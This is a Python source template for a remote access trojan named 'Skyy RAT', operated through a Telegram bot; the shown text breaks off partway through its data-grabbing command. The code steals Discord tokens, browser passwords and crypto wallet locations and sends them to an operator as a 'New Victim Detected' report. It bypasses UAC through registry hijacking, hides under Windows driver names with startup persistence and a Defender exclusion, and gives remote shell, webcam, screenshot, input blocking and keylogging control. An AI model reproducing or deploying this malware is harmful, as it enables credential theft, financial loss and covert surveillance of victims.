#!/usr/bin/env python3
"""
Skyy RAT Client Stub Template
This template gets compiled into the final RAT executable
"""

import os
import sys
import asyncio
import logging
import platform
import tempfile
import subprocess
import json
import time
import shutil
import base64
from datetime import datetime, timedelta
from getpass import getuser
from telegram import Update
from telegram.ext import Application, CommandHandler, MessageHandler, filters, ContextTypes
from PIL import ImageGrab
import psutil
import requests
import threading
import zipfile
import tempfile
import re
import random
import string
import wave
from io import BytesIO

# Optional imports - will gracefully fail if not available
try:
    import ctypes
    HAS_CTYPES = True
except ImportError:
    HAS_CTYPES = False

try:
    import winreg
    HAS_WINREG = True
except ImportError:
    HAS_WINREG = False

try:
    import sqlite3
    HAS_SQLITE = True
except ImportError:
    HAS_SQLITE = False

# Advanced features - optional
try:
    import cv2
    HAS_CV2 = True
except ImportError:
    HAS_CV2 = False

try:
    import pyaudio
    HAS_PYAUDIO = True
except ImportError:
    HAS_PYAUDIO = False

try:
    import pyttsx3
    HAS_TTS = True
except ImportError:
    HAS_TTS = False

try:
    from pynput import keyboard, mouse
    HAS_PYNPUT = True
except ImportError:
    HAS_PYNPUT = False

try:
    import monitorcontrol
    HAS_MONITOR_CONTROL = True
except ImportError:
    HAS_MONITOR_CONTROL = False

try:
    import win32crypt
    from Crypto.Cipher import AES
    HAS_CRYPTO = True
except ImportError:
    HAS_CRYPTO = False

# Configuration (replaced during build)
BOT_TOKEN = "{{BOT_TOKEN}}"
AUTH_TOKEN = "{{AUTH_TOKEN}}"
ENABLED_COMMANDS = {{ENABLED_COMMANDS}}

# Configure logging
logging.basicConfig(level=logging.ERROR)  # Minimal logging for stealth
logger = logging.getLogger(__name__)

# Global variables
current_directory = os.getcwd()
input_blocked = False
monitors_disabled = False
first_run = True
recording_active = False
recording_thread = None
keylogger_active = False
keylogger_thread = None
current_keylog = ""
keylog_file_path = ""
recording_active = False
recording_thread = None
keylogger_active = False
keylogger_thread = None
current_keylog = ""
keylog_file_path = ""

# System configuration
software_registry_name = 'WindowsDriverShell'
software_directory_name = 'WindowsShell'
software_executable_name = 'WindowsCamDriver.exe'

class SkyGrabber:
    """Skyy RAT Grabbing System - Rebranded from Blank Grabber"""

    def __init__(self):
        self.temp_folder = None
        self.separator = "\n\n" + "Skyy RAT".center(50, "=") + "\n\n"

    def get_random_string(self, length=10):
        """Generate random string"""
        return ''.join(random.choices(string.ascii_letters + string.digits, k=length))

    def grab_discord_tokens(self):
        """Grab Discord tokens from various clients and browsers"""
        try:
            tokens = []
            roaming = os.getenv("appdata")
            localappdata = os.getenv("localappdata")

            # Discord client paths
            paths = {
                "Discord": os.path.join(roaming, "discord"),
                "Discord Canary": os.path.join(roaming, "discordcanary"),
                "Discord PTB": os.path.join(roaming, "discordptb"),
                "Chrome": os.path.join(localappdata, "Google", "Chrome", "User Data"),
                "Edge": os.path.join(localappdata, "Microsoft", "Edge", "User Data"),
                "Firefox": os.path.join(roaming, "Mozilla", "Firefox", "Profiles"),
                "Opera": os.path.join(roaming, "Opera Software", "Opera Stable"),
                "Brave": os.path.join(localappdata, "BraveSoftware", "Brave-Browser", "User Data"),
            }

            token_regex = r"[\w-]{24,26}\.[\w-]{6}\.[\w-]{25,110}"

            for name, path in paths.items():
                if os.path.isdir(path):
                    try:
                        # Search for tokens in leveldb files
                        for root, dirs, files in os.walk(path):
                            for file in files:
                                if file.endswith(('.log', '.ldb')):
                                    file_path = os.path.join(root, file)
                                    try:
                                        with open(file_path, 'r', errors='ignore') as f:
                                            content = f.read()
                                            found_tokens = re.findall(token_regex, content)
                                            for token in found_tokens:
                                                if token not in tokens:
                                                    # Validate token
                                                    if self.validate_discord_token(token):
                                                        tokens.append(token)
                                    except:
                                        continue
                    except:
                        continue

            return tokens
        except:
            return []

    def validate_discord_token(self, token):
        """Validate Discord token by making API request"""
        try:
            headers = {
                "authorization": token,
                "content-type": "application/json",
                "user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"
            }
            response = requests.get("https://discord.com/api/v9/users/@me", headers=headers, timeout=5)
            return response.status_code == 200
        except:
            return False

    def grab_crypto_wallets(self):
        """Grab crypto wallet files"""
        try:
            wallets = []

            wallet_paths = {
                "Exodus": os.path.join(os.getenv("appdata"), "Exodus", "exodus.wallet"),
                "Electrum": os.path.join(os.getenv("appdata"), "Electrum", "wallets"),
                "Ethereum": os.path.join(os.getenv("appdata"), "Ethereum", "keystore"),
                "Atomic": os.path.join(os.getenv("appdata"), "atomic", "Local Storage", "leveldb"),
                "Coinomi": os.path.join(os.getenv("localappdata"), "Coinomi", "Coinomi", "wallets"),
                "Zcash": os.path.join(os.getenv("appdata"), "Zcash"),
                "Armory": os.path.join(os.getenv("appdata"), "Armory"),
                "Bytecoin": os.path.join(os.getenv("appdata"), "Bytecoin"),
                "Jaxx": os.path.join(os.getenv("appdata"), "com.liberty.jaxx", "IndexedDB", "file_0.indexeddb.leveldb"),
                "Guarda": os.path.join(os.getenv("appdata"), "Guarda", "Local Storage", "leveldb"),
            }

            # Check for wallet directories/files
            for wallet_name, wallet_path in wallet_paths.items():
                if os.path.exists(wallet_path):
                    wallets.append({
                        'name': wallet_name,
                        'path': wallet_path,
                        'type': 'directory' if os.path.isdir(wallet_path) else 'file'
                    })

            # Check for MetaMask in browsers
            browser_paths = {
                "Chrome": os.path.join(os.getenv("localappdata"), "Google", "Chrome", "User Data"),
                "Edge": os.path.join(os.getenv("localappdata"), "Microsoft", "Edge", "User Data"),
                "Brave": os.path.join(os.getenv("localappdata"), "BraveSoftware", "Brave-Browser", "User Data"),
            }

            for browser_name, browser_path in browser_paths.items():
                if os.path.isdir(browser_path):
                    for root, dirs, files in os.walk(browser_path):
                        if "Local Extension Settings" in root:
                            # MetaMask extension ID
                            metamask_dir = os.path.join(root, "nkbihfbeogaeaoehlefnkodbefgpgknn")
                            if os.path.isdir(metamask_dir):
                                wallets.append({
                                    'name': f'MetaMask ({browser_name})',
                                    'path': metamask_dir,
                                    'type': 'extension'
                                })

            return wallets
        except:
            return []

class SkyRATClient:
    def __init__(self):
        self.application = None
        self.authorized = False
        self.chat_id = None
        self.hostname = platform.node()
        self.keyboard_listener = None
        self.mouse_listener = None
        
    def get_self(self) -> tuple[str, bool]:
        """Returns the location of the file and whether exe mode is enabled"""
        if hasattr(sys, "frozen"):
            return (sys.executable, True)
        else:
            return (__file__, False)
            
    def is_admin(self) -> bool:
        """Check if running with admin privileges"""
        if not HAS_CTYPES:
            return False
        try:
            return ctypes.windll.shell32.IsUserAnAdmin() == 1
        except:
            return False
            
    def uac_bypass(self, method: int = 1) -> bool:
        """Try to bypass UAC and get admin permissions"""
        if not self.get_self()[1]:
            return False
            
        execute = lambda cmd: subprocess.run(cmd, shell=True, capture_output=True)
        
        try:
            if method == 1:
                execute(f"reg add hkcu\\Software\\Classes\\ms-settings\\shell\\open\\command /d \"{sys.executable}\" /f")
                execute("reg add hkcu\\Software\\Classes\\ms-settings\\shell\\open\\command /v \"DelegateExecute\" /f")
                execute("computerdefaults --nouacbypass")
                execute("reg delete hkcu\\Software\\Classes\\ms-settings /f")
                return True
            elif method == 2:
                execute(f"reg add hkcu\\Software\\Classes\\ms-settings\\shell\\open\\command /d \"{sys.executable}\" /f")
                execute("reg add hkcu\\Software\\Classes\\ms-settings\\shell\\open\\command /v \"DelegateExecute\" /f")
                execute("fodhelper --nouacbypass")
                execute("reg delete hkcu\\Software\\Classes\\ms-settings /f")
                return True
        except:
            pass
            
        return False
        
    def add_to_startup(self):
        """Add to Windows startup"""
        if not HAS_WINREG:
            return
        try:
            if os.name == 'nt':
                startup_path = f'C:\\Users\\{getuser()}\\{software_directory_name}\\{software_executable_name}'
                reg_key = winreg.CreateKey(winreg.HKEY_CURRENT_USER, 'Software\\Microsoft\\Windows\\CurrentVersion\\Run')
                winreg.SetValueEx(reg_key, software_registry_name, 0, winreg.REG_SZ, startup_path)
                winreg.CloseKey(reg_key)
        except Exception as e:
            logger.error(f"Startup error: {e}")
            
    def install_persistence(self):
        """Install persistence and copy to system directory"""
        try:
            target_path = f'C:\\Users\\{getuser()}\\{software_directory_name}\\{software_executable_name}'
            
            if sys.argv[0].lower() != target_path.lower():
                os.makedirs(f'C:\\Users\\{getuser()}\\{software_directory_name}', exist_ok=True)
                shutil.copy2(sys.argv[0], target_path)
                self.add_to_startup()
                subprocess.Popen([target_path], creationflags=subprocess.CREATE_NO_WINDOW)
                sys.exit(0)
        except Exception as e:
            logger.error(f"Persistence error: {e}")
            
    def add_defender_exclusion(self):
        """Add Windows Defender exclusion"""
        try:
            if self.is_admin():
                exclusion_path = f'C:\\Users\\{getuser()}\\{software_directory_name}'
                subprocess.run([
                    'powershell', '-Command', 
                    f'Add-MpPreference -ExclusionPath "{exclusion_path}"'
                ], creationflags=subprocess.CREATE_NO_WINDOW)
        except:
            pass
            
    def create_key_file(self):
        """Create first run marker file"""
        global first_run
        try:
            appdata_path = os.getenv('APPDATA')
            file_path = os.path.join(appdata_path, 'ri9ypii.file')
            
            if not os.path.exists(file_path):
                with open(file_path, 'w') as f:
                    f.write('6042')
                first_run = True
            else:
                first_run = False
        except:
            first_run = False
            
    def kill_duplicate_processes(self):
        """Kill other instances of this process"""
        try:
            executable_name = os.path.basename(sys.executable)
            current_pid = os.getpid()
            
            for proc in psutil.process_iter(['pid', 'name']):
                if proc.info['name'] == executable_name and proc.info['pid'] != current_pid:
                    proc.terminate()
        except:
            pass
            
    def get_system_info(self):
        """Get system information"""
        try:
            ip_address = requests.get('https://api.ipify.org', timeout=5).text.strip()
            geo_response = requests.get(f'https://ipapi.co/{ip_address}/json/', timeout=5).json()
            
            city = geo_response.get('city', 'Unknown')
            region = geo_response.get('region', 'Unknown')
            country = geo_response.get('country_name', 'Unknown')
            
            geolocation = f"City: {city}, Region: {region}, Country: {country}"
            hardware_info = f"CPU: {platform.processor()}, OS: {platform.system()} {platform.release()}"
            
            wifi_info = ""
            for interface_name, interface_addresses in psutil.net_if_addrs().items():
                for address in interface_addresses:
                    if interface_name == 'Wi-Fi' and str(address.family) == 'AddressFamily.AF_INET':
                        wifi_info = f"SSID: {interface_name}, IP: {address.address}"
                        break
                        
            return {
                'hostname': self.hostname,
                'ip_address': ip_address,
                'geolocation': geolocation,
                'hardware_info': hardware_info,
                'wifi_info': wifi_info
            }
        except:
            return {
                'hostname': self.hostname,
                'ip_address': 'Unknown',
                'geolocation': 'Unknown',
                'hardware_info': f"OS: {platform.system()} {platform.release()}",
                'wifi_info': 'Unknown'
            }
            
    def current_time(self, seconds_also=False):
        """Get current time formatted"""
        return datetime.now().strftime('%d.%m.%Y_%H.%M' if not seconds_also else '%d.%m.%Y_%H.%M.%S')
        
    def force_decode(self, b: bytes):
        """Force decode bytes to string"""
        try:
            return b.decode('utf-8')
        except UnicodeDecodeError:
            return b.decode(errors="backslashreplace")

    # Password grabbing functions (from Discord RAT)
    def get_chrome_datetime(self, chromedate):
        """Convert Chrome timestamp to datetime"""
        return datetime(1601, 1, 1) + timedelta(microseconds=chromedate)

    def get_encryption_key(self):
        """Get Chrome encryption key"""
        if not HAS_CRYPTO:
            return None
        try:
            local_state_path = os.path.join(os.environ["USERPROFILE"], "AppData", "Local", "Google", "Chrome", "User Data", "Local State")
            with open(local_state_path, "r", encoding="utf-8") as f:
                local_state = f.read()
                local_state = json.loads(local_state)
            key = base64.b64decode(local_state["os_crypt"]["encrypted_key"])[5:]
            return win32crypt.CryptUnprotectData(key, None, None, None, 0)[1]
        except:
            return None

    def decrypt_password_chrome(self, password, key):
        """Decrypt Chrome password"""
        if not HAS_CRYPTO:
            return ""
        try:
            iv = password[3:15]
            password = password[15:]
            cipher = AES.new(key, AES.MODE_GCM, iv)
            return cipher.decrypt(password)[:-16].decode()
        except:
            try:
                return str(win32crypt.CryptUnprotectData(password, None, None, None, 0)[1])
            except:
                return ""

    def grab_chrome_passwords(self):
        """Grab Chrome saved passwords"""
        if not HAS_SQLITE or not HAS_CRYPTO:
            return {}
        try:
            key = self.get_encryption_key()
            if not key:
                return {}

            db_path = os.path.join(os.environ["USERPROFILE"], "AppData", "Local", "Google", "Chrome", "User Data", "default", "Login Data")
            file_name = "ChromeData.db"
            shutil.copyfile(db_path, file_name)

            db = sqlite3.connect(file_name)
            cursor = db.cursor()
            cursor.execute("select origin_url, action_url, username_value, password_value, date_created, date_last_used from logins order by date_created")

            result = {}
            for row in cursor.fetchall():
                action_url = row[1]
                username = row[2]
                password = self.decrypt_password_chrome(row[3], key)
                if username or password:
                    result[action_url] = [username, password]

            cursor.close()
            db.close()
            os.remove(file_name)
            return result
        except:
            return {}

    def grab_edge_passwords(self):
        """Grab Edge saved passwords"""
        try:
            with open(os.environ['USERPROFILE'] + os.sep + r'AppData\Local\Microsoft\Edge\User Data\Local State', "r", encoding='utf-8') as f:
                local_state = f.read()
                local_state = json.loads(local_state)
            master_key = base64.b64decode(local_state["os_crypt"]["encrypted_key"])[5:]
            master_key = win32crypt.CryptUnprotectData(master_key, None, None, None, 0)[1]

            login_db = os.environ['USERPROFILE'] + os.sep + r'AppData\Local\Microsoft\Edge\User Data\Default\Login Data'
            shutil.copy2(login_db, "Loginvault.db")

            conn = sqlite3.connect("Loginvault.db")
            cursor = conn.cursor()
            cursor.execute("SELECT action_url, username_value, password_value FROM logins")

            result = {}
            for r in cursor.fetchall():
                url = r[0]
                username = r[1]
                encrypted_password = r[2]

                try:
                    iv = encrypted_password[3:15]
                    payload = encrypted_password[15:]
                    cipher = AES.new(master_key, AES.MODE_GCM, iv)
                    decrypted_password = cipher.decrypt(payload)[:-16].decode()

                    if username != "" or decrypted_password != "":
                        result[url] = [username, decrypted_password]
                except:
                    pass

            cursor.close()
            conn.close()
            os.remove("Loginvault.db")
            return result
        except:
            return {}

    def grab_passwords(self):
        """Grab all saved passwords"""
        result = {}
        try:
            chrome_passwords = self.grab_chrome_passwords()
            result.update(chrome_passwords)
        except:
            pass

        try:
            edge_passwords = self.grab_edge_passwords()
            result.update(edge_passwords)
        except:
            pass

        return result

    # Telegram Bot Command Handlers
    async def start_command(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
        """Handle /start command - authorization"""
        if self.authorized:
            await self.show_client_list(update)
        else:
            await update.message.reply_text(
                "🔐 **Authorization Required**\n\n"
                "Please enter your 15-digit authorization token:",
                parse_mode='Markdown'
            )

    async def handle_auth_token(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
        """Handle authorization token input"""
        if self.authorized:
            return

        token = update.message.text.strip()

        if token == AUTH_TOKEN:
            self.authorized = True
            self.chat_id = update.effective_chat.id

            # Send first run info if applicable
            if first_run:
                await self.send_first_run_info(update)

            await self.show_client_list(update)
        else:
            await update.message.reply_text("❌ Invalid authorization token. Please try again.")

    async def show_client_list(self, update: Update):
        """Show list of connected clients"""
        system_info = self.get_system_info()

        message = f"🟢 **Client Online**\n\n"
        message += f"**Hostname:** {system_info['hostname']}\n"
        message += f"**IP Address:** {system_info['ip_address']}\n"
        message += f"**Location:** {system_info['geolocation']}\n"
        message += f"**Hardware:** {system_info['hardware_info']}\n"
        message += f"**Network:** {system_info['wifi_info']}\n\n"
        message += "**Available Commands:**\n"

        # Show only enabled commands
        command_list = []
        if "/ss" in ENABLED_COMMANDS:
            command_list.append("/ss - Take screenshot")
        if "/cmd" in ENABLED_COMMANDS:
            command_list.append("/cmd <command> - Execute shell command")
        if "/cd" in ENABLED_COMMANDS:
            command_list.append("/cd <path> - Change directory")
        if "/ls" in ENABLED_COMMANDS:
            command_list.append("/ls - List directory contents")
        if "/execute" in ENABLED_COMMANDS:
            command_list.append("/execute <file> - Execute file")
        if "/listprocesses" in ENABLED_COMMANDS:
            command_list.append("/listprocesses - Show running processes")
        if "/killprocess" in ENABLED_COMMANDS:
            command_list.append("/killprocess <pid> - Kill process")
        if "/remove" in ENABLED_COMMANDS:
            command_list.append("/remove <file> - Delete file")
        if "/webcam" in ENABLED_COMMANDS:
            command_list.append("/webcam - Take webcam photo")
        if "/livemic" in ENABLED_COMMANDS:
            command_list.append("/livemic - Stream microphone")
        if "/upload" in ENABLED_COMMANDS:
            command_list.append("/upload - Upload file to target")
        if "/tts" in ENABLED_COMMANDS:
            command_list.append("/tts <message> - Text-to-speech")
        if "/blockinput" in ENABLED_COMMANDS:
            command_list.append("/blockinput - Block user input")
        if "/unblockinput" in ENABLED_COMMANDS:
            command_list.append("/unblockinput - Unblock user input")
        if "/disablemonitors" in ENABLED_COMMANDS:
            command_list.append("/disablemonitors - Turn off monitors")
        if "/enablemonitors" in ENABLED_COMMANDS:
            command_list.append("/enablemonitors - Turn on monitors")
        if "/help" in ENABLED_COMMANDS:
            command_list.append("/help - Show all commands")
        if "/grab" in ENABLED_COMMANDS:
            command_list.append("/grab <target> - Grab data (discord/passwords/wallets/all)")
        if "/startrecording" in ENABLED_COMMANDS:
            command_list.append("/startrecording - Start mic recording (2min intervals)")
        if "/stoprecording" in ENABLED_COMMANDS:
            command_list.append("/stoprecording - Stop mic recording")
        if "/startkeylogger" in ENABLED_COMMANDS:
            command_list.append("/startkeylogger - Start real-time keylogger")
        if "/stopkeylogger" in ENABLED_COMMANDS:
            command_list.append("/stopkeylogger - Stop real-time keylogger")
        if "/offlinekeylogger" in ENABLED_COMMANDS:
            command_list.append("/offlinekeylogger - Upload saved keylog file")

        message += "\n".join(command_list)

        await update.message.reply_text(message, parse_mode='Markdown')

    async def send_first_run_info(self, update: Update):
        """Send first run information and grabbed passwords"""
        try:
            system_info = self.get_system_info()

            # Send system info
            message = "🎯 **New Victim Detected**\n\n"
            message += f"**Hostname:** {system_info['hostname']}\n"
            message += f"**IP Address:** {system_info['ip_address']}\n"
            message += f"**Location:** {system_info['geolocation']}\n"
            message += f"**Hardware:** {system_info['hardware_info']}\n"
            message += f"**Network:** {system_info['wifi_info']}\n"

            await update.message.reply_text(message, parse_mode='Markdown')

            # Grab and send passwords
            passwords = self.grab_passwords()
            if passwords:
                password_message = "🔑 **Grabbed Saved Passwords**\n\n"
                for url, creds in passwords.items():
                    if len(password_message) > 3500:  # Telegram message limit
                        await update.message.reply_text(password_message, parse_mode='Markdown')
                        password_message = "🔑 **Grabbed Saved Passwords (continued)**\n\n"

                    password_message += f"🔗 **{url}**\n"
                    password_message += f"👤 Username: `{creds[0]}`\n"
                    password_message += f"🔑 Password: `{creds[1]}`\n\n"

                if len(password_message) > 50:  # Has content
                    await update.message.reply_text(password_message, parse_mode='Markdown')

        except Exception as e:
            logger.error(f"First run info error: {e}")

    async def screenshot_command(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
        """Handle /ss command"""
        if not self.authorized:
            return

        try:
            appdata_path = os.getenv('APPDATA')
            screenshot_path = f'{appdata_path}\\ss_{self.current_time()}.png'

            # Take screenshot
            ImageGrab.grab(all_screens=True).save(screenshot_path)

            # Send screenshot
            with open(screenshot_path, 'rb') as photo:
                await update.message.reply_photo(
                    photo=photo,
                    caption=f"📸 Screenshot taken at {self.current_time()}"
                )

            # Clean up
            os.remove(screenshot_path)

        except Exception as e:
            await update.message.reply_text(f"❌ Screenshot failed: {str(e)}")

    async def cmd_command(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
        """Handle /cmd command"""
        if not self.authorized:
            return

        if not context.args:
            await update.message.reply_text("❌ Usage: /cmd <command>")
            return

        command = ' '.join(context.args)

        try:
            result = subprocess.run(command, capture_output=True, shell=True, text=True)
            output = result.stdout if result.stdout else result.stderr

            if not output:
                output = "Command executed successfully (no output)"

            # Split long output into chunks
            if len(output) > 4000:
                chunks = [output[i:i+4000] for i in range(0, len(output), 4000)]
                for i, chunk in enumerate(chunks):
                    await update.message.reply_text(f"```\nOutput {i+1}/{len(chunks)}:\n{chunk}\n```", parse_mode='Markdown')
            else:
                await update.message.reply_text(f"```\n{output}\n```", parse_mode='Markdown')

        except Exception as e:
            await update.message.reply_text(f"❌ Command failed: {str(e)}")

    async def cd_command(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
        """Handle /cd command"""
        if not self.authorized:
            return

        global current_directory

        if not context.args:
            await update.message.reply_text(f"📁 Current directory: `{os.getcwd()}`", parse_mode='Markdown')
            return

        directory = ' '.join(context.args)
        normalized_directory = os.path.normpath(directory)

        try:
            if os.path.isdir(normalized_directory):
                os.chdir(normalized_directory)
                current_directory = normalized_directory
                await update.message.reply_text(f"✅ Changed directory to: `{os.getcwd()}`", parse_mode='Markdown')
            else:
                await update.message.reply_text(f"❌ Directory not found: `{normalized_directory}`", parse_mode='Markdown')
        except Exception as e:
            await update.message.reply_text(f"❌ Error changing directory: {str(e)}")

    async def ls_command(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
        """Handle /ls command"""
        if not self.authorized:
            return

        try:
            current_dir = os.getcwd()
            contents = os.listdir(current_dir)

            if contents:
                # Split into files and directories
                files = []
                dirs = []

                for item in contents:
                    item_path = os.path.join(current_dir, item)
                    if os.path.isdir(item_path):
                        dirs.append(f"📁 {item}")
                    else:
                        files.append(f"📄 {item}")

                response = f"📁 **Directory:** `{current_dir}`\n\n"

                if dirs:
                    response += "**Directories:**\n" + "\n".join(dirs[:20]) + "\n\n"
                if files:
                    response += "**Files:**\n" + "\n".join(files[:20])

                if len(contents) > 40:
                    response += f"\n\n... and {len(contents) - 40} more items"

            else:
                response = f"📁 **Directory:** `{current_dir}`\n\n📭 Directory is empty"

            await update.message.reply_text(response, parse_mode='Markdown')

        except PermissionError:
            await update.message.reply_text("❌ Permission denied")
        except Exception as e:
            await update.message.reply_text(f"❌ Error listing directory: {str(e)}")

    async def execute_command(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
        """Handle /execute command"""
        if not self.authorized:
            return

        if not context.args:
            await update.message.reply_text("❌ Usage: /execute <file_path>")
            return

        file_path = ' '.join(context.args)
        full_path = os.path.join(os.getcwd(), file_path)

        try:
            if not os.path.isfile(full_path):
                await update.message.reply_text(f"❌ File not found: `{full_path}`", parse_mode='Markdown')
                return

            result = subprocess.run(full_path, shell=True, check=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True)

            output = result.stdout if result.stdout else "File executed successfully"
            await update.message.reply_text(f"✅ Executed `{file_path}`\n\n```\n{output}\n```", parse_mode='Markdown')

        except subprocess.CalledProcessError as e:
            error_msg = e.stderr if e.stderr else str(e)
            await update.message.reply_text(f"❌ Execution failed: `{error_msg}`", parse_mode='Markdown')
        except Exception as e:
            await update.message.reply_text(f"❌ Error executing file: {str(e)}")

    async def listprocesses_command(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
        """Handle /listprocesses command"""
        if not self.authorized:
            return

        try:
            processes = [(p.name(), p.pid) for p in psutil.process_iter(['name', 'pid'])]

            message = "🔄 **Running Processes:**\n\n"

            # Group processes and show top 30
            for i, (name, pid) in enumerate(processes[:30]):
                message += f"`{pid}` - {name}\n"

            if len(processes) > 30:
                message += f"\n... and {len(processes) - 30} more processes"

            await update.message.reply_text(message, parse_mode='Markdown')

        except Exception as e:
            await update.message.reply_text(f"❌ Error listing processes: {str(e)}")

    async def killprocess_command(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
        """Handle /killprocess command"""
        if not self.authorized:
            return

        if not context.args:
            await update.message.reply_text("❌ Usage: /killprocess <pid>")
            return

        try:
            pid = int(context.args[0])
            process = psutil.Process(pid)
            process_name = process.name()
            process.terminate()

            await update.message.reply_text(f"✅ Terminated process: `{process_name}` (PID: {pid})", parse_mode='Markdown')

        except psutil.NoSuchProcess:
            await update.message.reply_text(f"❌ No process found with PID: {context.args[0]}")
        except psutil.AccessDenied:
            await update.message.reply_text(f"❌ Access denied to terminate PID: {context.args[0]}")
        except ValueError:
            await update.message.reply_text("❌ Invalid PID. Please provide a number.")
        except Exception as e:
            await update.message.reply_text(f"❌ Error killing process: {str(e)}")

    async def remove_command(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
        """Handle /remove command"""
        if not self.authorized:
            return

        if not context.args:
            await update.message.reply_text("❌ Usage: /remove <filename>")
            return

        filename = ' '.join(context.args)
        file_path = os.path.join(os.getcwd(), filename)

        try:
            if not os.path.isfile(file_path):
                await update.message.reply_text(f"❌ File not found: `{file_path}`", parse_mode='Markdown')
                return

            os.remove(file_path)
            await update.message.reply_text(f"✅ File removed: `{file_path}`", parse_mode='Markdown')

        except Exception as e:
            await update.message.reply_text(f"❌ Error removing file: {str(e)}")

    async def webcam_command(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
        """Handle /webcam command"""
        if not self.authorized:
            return

        if not HAS_CV2:
            await update.message.reply_text("❌ Webcam feature not available (cv2 not installed)")
            return

        try:
            temp_dir = tempfile.gettempdir()
            webcam_path = os.path.join(temp_dir, f"webcam_{self.current_time()}.png")

            # Capture webcam
            camera = cv2.VideoCapture(0)
            ret, frame = camera.read()

            if ret:
                cv2.imwrite(webcam_path, frame)
                camera.release()

                # Send webcam photo
                with open(webcam_path, 'rb') as photo:
                    await update.message.reply_photo(
                        photo=photo,
                        caption=f"📷 Webcam capture at {self.current_time()}"
                    )

                # Clean up
                os.remove(webcam_path)
            else:
                await update.message.reply_text("❌ No camera found or cannot access camera")

        except Exception as e:
            await update.message.reply_text(f"❌ Webcam capture failed: {str(e)}")

    async def upload_command(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
        """Handle /upload command"""
        if not self.authorized:
            return

        await update.message.reply_text("📤 Please send the file you want to upload to this computer.")

    async def handle_file_upload(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
        """Handle file uploads"""
        if not self.authorized or not update.message.document:
            return

        try:
            document = update.message.document
            file_path = os.path.join(os.getcwd(), document.file_name)

            # Download file
            file = await context.bot.get_file(document.file_id)
            await file.download_to_drive(file_path)

            await update.message.reply_text(f"✅ File uploaded: `{file_path}`", parse_mode='Markdown')

        except Exception as e:
            await update.message.reply_text(f"❌ Upload failed: {str(e)}")

    async def tts_command(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
        """Handle /tts command"""
        if not self.authorized:
            return

        if not context.args:
            await update.message.reply_text("❌ Usage: /tts <message>")
            return

        if not HAS_TTS:
            await update.message.reply_text("❌ Text-to-speech feature not available (pyttsx3 not installed)")
            return

        message = ' '.join(context.args)

        try:
            engine = pyttsx3.init()
            engine.say(message)
            engine.runAndWait()
            engine.stop()

            await update.message.reply_text(f"🔊 Spoke: `{message}`", parse_mode='Markdown')

        except Exception as e:
            await update.message.reply_text(f"❌ TTS failed: {str(e)}")

    async def blockinput_command(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
        """Handle /blockinput command"""
        if not self.authorized:
            return

        if not HAS_PYNPUT:
            await update.message.reply_text("❌ Input blocking feature not available (pynput not installed)")
            return

        global input_blocked

        if not input_blocked:
            try:
                self.keyboard_listener = keyboard.Listener(suppress=True)
                self.mouse_listener = mouse.Listener(suppress=True)
                self.keyboard_listener.start()
                self.mouse_listener.start()

                input_blocked = True
                await update.message.reply_text("🔒 User input has been blocked!")

            except Exception as e:
                await update.message.reply_text(f"❌ Failed to block input: {str(e)}")
        else:
            await update.message.reply_text("⚠️ Input is already blocked!")

    async def unblockinput_command(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
        """Handle /unblockinput command"""
        if not self.authorized:
            return

        if not HAS_PYNPUT:
            await update.message.reply_text("❌ Input unblocking feature not available (pynput not installed)")
            return

        global input_blocked

        if input_blocked:
            try:
                if self.keyboard_listener:
                    self.keyboard_listener.stop()
                if self.mouse_listener:
                    self.mouse_listener.stop()

                input_blocked = False
                await update.message.reply_text("🔓 User input has been unblocked!")

            except Exception as e:
                await update.message.reply_text(f"❌ Failed to unblock input: {str(e)}")
        else:
            await update.message.reply_text("⚠️ Input is not blocked!")

    async def disablemonitors_command(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
        """Handle /disablemonitors command"""
        if not self.authorized:
            return

        if not HAS_MONITOR_CONTROL:
            await update.message.reply_text("❌ Monitor control feature not available (monitorcontrol not installed)")
            return

        global monitors_disabled

        if not monitors_disabled:
            try:
                def monitor_off():
                    while monitors_disabled:
                        for monitor in monitorcontrol.get_monitors():
                            with monitor:
                                monitor.set_power_mode(4)  # Off
                        time.sleep(1)

                monitors_disabled = True
                threading.Thread(target=monitor_off, daemon=True).start()

                await update.message.reply_text("📺 Monitors have been disabled!")

            except Exception as e:
                await update.message.reply_text(f"❌ Failed to disable monitors: {str(e)}")
        else:
            await update.message.reply_text("⚠️ Monitors are already disabled!")

    async def enablemonitors_command(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
        """Handle /enablemonitors command"""
        if not self.authorized:
            return

        if not HAS_MONITOR_CONTROL:
            await update.message.reply_text("❌ Monitor control feature not available (monitorcontrol not installed)")
            return

        global monitors_disabled

        if monitors_disabled:
            try:
                monitors_disabled = False

                for monitor in monitorcontrol.get_monitors():
                    with monitor:
                        monitor.set_power_mode(1)  # On

                await update.message.reply_text("📺 Monitors have been enabled!")

            except Exception as e:
                await update.message.reply_text(f"❌ Failed to enable monitors: {str(e)}")
        else:
            await update.message.reply_text("⚠️ Monitors are already enabled!")

    async def grab_command(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
        """Handle /grab command"""
        if not self.authorized:
            return

        if not context.args:
            await update.message.reply_text(
                "🎯 **Skyy RAT Grabber**\n\n"
                "**Usage:** `/grab <target>`\n\n"
                "**Available targets:**\n"
                "• `discord` - Grab Discord tokens\n"
                "• `passwords` - Grab saved passwords\n"
                "• `wallets` - Grab crypto wallets\n"
                "• `all` - Grab everything\n\n"
                "**Example:** `/grab discord`",
                parse_mode='Markdown'
            )
            return

        target = context.args[0].lower()
        grabber = SkyGrabber()

        try:
            if target == "discord":
                await update.message.reply_text("🔍 Grabbing Discord tokens...")
                tokens = grabber.grab_discord_tokens()

                if tokens:
